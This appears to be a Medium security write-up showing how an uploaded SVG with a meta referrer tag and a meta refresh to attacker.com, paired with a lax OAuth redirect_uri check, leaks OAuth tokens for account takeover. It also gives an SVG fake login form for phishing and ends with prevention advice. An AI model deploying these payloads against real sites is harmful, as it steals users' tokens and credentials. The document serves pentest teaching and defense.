# SVG Abuse: Account Takeover Without XSS

> **Author**: Austin Long
> **Published**: Apr 28, 2026

---

![Austin Long](https://miro.medium.com/v2/resize:fill:32:32/1*dYMKIM_8f8eccYy2NlHhXQ.png)

6

Listen

Share

SVG uploads are a fun attack surface! Most testers check for XSS, but what if the Content Security Policy (CSP)is set to script-src: none?

![image](https://miro.medium.com/v2/resize:fit:220/0*7jme5xy7PNngZ4TF.gif)

Not all is lost! This write-up covers a technique that chains SVG’s lesser-known HTML embedding capability with a permissive OAuth redirect to achieve an account takeover.

Another bonus vector at the end is also shown, which could be used during red team or pentest engagements that is perfect for phishing campaigns!

## The Primitives

### Primitive 1: SVG Upload

This primitive is heavily target-dependent. The goal here is to find pretty much any file upload opportunities. The most common upload sections I’ve seen when testing are profile image uploads for user accounts.

Applications commonly implement file type validation client-side, or server-side by checking only the Content-Type header rather than inspecting the file’s magic bytes. SVGs may be blocked client-side. A real example that I’ve come across is that the server enforced the Content-Type
image/* but blocked SVGs client side. Why? Images are supposed to be benign; how can they be malicious? Well, this relaxed content-type validation allowed me to smuggle an SVG by supplying the content type image/svg+xml via an interception proxy.

Test approach:
Intercept the multipart upload request and modify the Content-Type header of the file part:

```
Content-Disposition: form-data; name="photo"; filename="payload.svg"
Content-Type: image/svg+xml
```

Ensure you also set the actual content to a test SVG, such as the following (a red circle)

```
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200">
  <circle cx="100" cy="100" r="80" fill="red" />
</svg>
```

If the server accepts it and the file is served back from the main application domain (not a CDN or S3 bucket), you have the primitive.

### Primitive 2: OAuth Redirect URI

OAuth implementations are frequently misconfigured to accept any redirect URI that matches a domain prefix rather than an exact string. When this is the case, an attacker can set redirect_uri to any path under the target domain, including one that they control the content of. For example, the first primitive may have the URL of:

https://example.com/uploads/avatars/attacker-profile.svg

If the application only checks for example.com in the redirect_uri (https://*.example.com/*), then you have the second primitive.

OAuth authorization codes or tokens get appended to that URL as a query parameter before the redirect occurs, placing it in the browser’s address bar.

## The Exploitation Chain

### Step 1: Craft the SVG Payload

SVG supports embedding arbitrary HTML via the <foreignObject> element. This is typically used for rich text rendering, but it also allows injection of <meta> tags.

Why this matters: you can set the Referrer-Policy to unsafe-url from within an SVG served on the target domain, then immediately redirect to your external collection server via another <meta>tag with a browser refresh. The browser will send the full URL, including the OAuth token in the query string, in the Referrer header.

The payload looks like this:

```
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100%" height="100%">
    <html xmlns="http://www.w3.org/1999/xhtml">
      <head>
        <meta name="referrer" content="unsafe-url"/>
        <meta http-equiv="refresh" content="0;url=https://attacker.com/collect"/>
      </head>
    </html>
  </foreignObject>
</svg>
```

### Step 2: Obtain a URL for Your Payload

After uploading, note the full URL where the SVG is served. An example:

https://example.com/uploads/avatars/a1b2c3.svg

This URL must be accessible without authentication for the attack to work against any users.

### Step 3: Construct the OAuth Link

Build an authorization URL for the target’s OAuth provider (Google, Discord, etc.) with your SVG URL as the redirect_uri. Most applications will start the OAuth process by including a preliminary redirect parameter.

## Get Austin Long’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

Just change the redirect parameter to your SVG location, like:

https://example.com/login?redirect=https://example.com/uploads/avatars/a1b2c3.svg

If all goes well, the application will create an OAuth link with the chosen provider. When the victim follows this link and authenticates, the OAuth provider redirects to your malicious SVG.

The browser loads the SVG. The <meta name="referrer" content="unsafe-url"> tag fires. The <meta http-equiv="refresh"> redirects to your server. The Referer header carries the full URL, and if the token is included in the URL, it will be leaked in your access logs on your server.

### Step 4: Collect the Token

On your collection server, capture the Referrer header from incoming requests. You can view this by accessing your access.log if using NGINX or if using Burp Collaborator, the header should be exposed as well:

```
GET /collect HTTP/1.1
Host: attacker.com
Referer: https://example.com/uploads/avatars/a1b2c3.svg?access_token=ya29.xxxx
```

### Step 5: Verify the Token

As always, verify the full proof of concept! Verify that you can successfully login using the leaked token by exchanging the token to the actual OAuth exchange URI. Since the token was not consumed due to the redirect to the SVG endpoint, the application should grant you access to the targeted user’s account.

## Why Modern Referrer Policy Doesn’t Save You Here

By default, modern browsers apply strict-origin-when-cross-origin, which strips query parameters and fragments when navigating cross-origin. Under normal circumstances, a redirect from example.com/page?token=xyz to attacker.com would only send https://example.com/ as the referrer. This was a change that modern browsers adopted back in 2020 (https://developer.chrome.com/blog/referrer-policy-new-chrome-default).

The SVG <meta> tag circumvents this entirely. Because the SVG is served from example.com, the meta tag’s referrer policy applies to that document’s outbound navigation, overriding the browser default or sometimes, the application-level policy with unsafe-url.

## Prevention

- SVG upload: Block image/svg+xml server-side via magic bytes, not just Content-Type header; or serve all user uploads from an isolated origin
- OAuth redirect validation: Enforce exact-match redirect_uri validation; wildcard path matching on a domain is a misconfiguration per RFC 6749
- SVG rendering Strip <foreignObject> and <meta> elements from uploaded SVGs via server-side sanitization before storage if SVGs are necessary

## Bonus Vectors

Okay! But what if you do not have the first primitive? Well, SVGs can still be abused.

You can still provide impact by modifying the SVG to look like login prompt. The SVG may render within the same application domain; making it appear more trusting. This could lead to a high success rate for a phishing campaign that may occur in pentests or red team engagements. An example payload would look like this:

```
<?xml version="1.0" encoding="UTF-8"?>
   <svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
      <foreignObject width="100%" height="100%">
         <body xmlns="http://www.w3.org/1999/xhtml">
            <style>
               * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
               body { background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; }
               .card { background: white; padding: 24px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.15); width: 320px; }
               .logo { text-align: center; font-size: 20px; font-weight: bold; color: #333; margin-bottom: 20px; }
               input { width: 100%; padding: 10px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
               button { width: 100%; padding: 10px; background: #555; color: white; border: none; border-radius: 4px; font-size: 14px; }
               .note { font-size: 11px; color: #999; text-align: center; margin-top: 10px; }
            </style>
            <h1>Login</h1>
            <form action="https://example.com/">
               <label>Email</label><input type="text" name="email"/>
               <label>Password</label><input type="password" name="password"/>
               <input type="submit" value="Sign In"/>
            </form>
         </body>
      </foreignObject>
   </svg>
```

The above renders as:

![image](https://miro.medium.com/v2/resize:fit:700/1*folOrqKU4HOHhfYMyr8lmw.png)

Now, when a user inputs their credentials, it should be sent to the specified server!

![image](https://miro.medium.com/v2/resize:fit:700/1*jt5thHcGPGgO8wGoNQ9gVQ.png)

![image](https://miro.medium.com/v2/resize:fit:700/1*BLdIi-X7X3u2sK6Nfmn4oA.png)

Last but not least, you can still abuse the meta tag for the open redirect, which could pair well with other vulnerabilities!



---
*Original URL: [https://medium.com/@netmarauder/svg-abuse-account-takeover-without-xss-99280905e134?source=search_post---------18-----------------------------------](https://medium.com/@netmarauder/svg-abuse-account-takeover-without-xss-99280905e134?source=search_post---------18-----------------------------------)*
